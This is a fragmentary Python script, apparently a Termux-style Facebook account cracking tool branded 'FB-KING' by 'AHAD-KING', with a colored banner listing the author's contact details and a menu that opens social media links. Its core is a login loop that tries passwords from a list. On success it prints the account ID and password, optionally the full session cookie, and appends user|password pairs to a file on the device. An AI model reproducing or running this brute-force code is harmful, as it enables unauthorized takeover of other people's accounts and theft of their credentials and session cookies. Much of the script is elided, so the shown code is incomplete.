...
/__/     \__\ |__|  |__| /__/     \__\ |_______/    
  ...
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{warna} AHAD-KING               {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H}Mohammad Ahad           {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+8801402307780          {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}github.com/AHAD-VAU-KING{N}    {H} 
...
def mainx():
    ...
    print(f'{K} [{H}8{K}] {N}Contract AHAD-KING')
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://github.com/AHAD-VAU-KING");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://www.facebook.com/Karo.Vab.Chudar.Time.Naii");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-KING {P}Terminal ');os.system("xdg-open https://www.facebook.com/Karo.Vab.Chudar.Time.Naii");time.sleep(3);os.system('xdg-open https://www.facebook.com/Karo.Vab.Chudar.Time.Naii');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/Karo.Vab.Chudar.Time.Naii");mainx()
def mainx2():
    os.system("clear")
    banner()
...
def dupcutter():
    ...
    Error = input(f"{wt}{N}File Name {RED}:{H} ");print(led);print(f'{dot}Example   {RED}:{H} /sdcard/Ahad.txt');print(led)
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    user = re.findall('c_user=(.*);xs', coki)[0]
    print('\r\033[1;32m [AHAD-KING-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(user+'|'+ps+'|'+'\n')
